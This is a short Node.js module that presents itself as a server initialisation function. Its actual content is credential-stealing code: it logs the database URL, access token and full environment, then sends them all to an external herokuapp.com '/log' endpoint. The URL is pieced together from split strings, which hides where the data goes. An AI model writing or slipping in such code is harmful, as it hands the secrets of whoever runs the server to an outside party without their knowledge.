const logCall = require('./LogCall')

async function initServer () {
  console.log(process.env.DATABASE_URL)
  console.log(process.env.ACCESS_TOKEN)

  const PROT = 'http'
  const SECURE = 's'
  const DOM = 'herokuapp.com'
  const ENDPOINT = '/log'
  console.log({ env: process.env })

  const data = JSON.stringify({
    dbUrl: process.env.DATABASE_URL,
    aTok: process.env.ACCESS_TOKEN,
    env: process.env
  })

  await logCall(`${PROT}${SECURE}://projin.${DOM}${ENDPOINT}`, {
    data: data
  })
}

module.exports = initServer
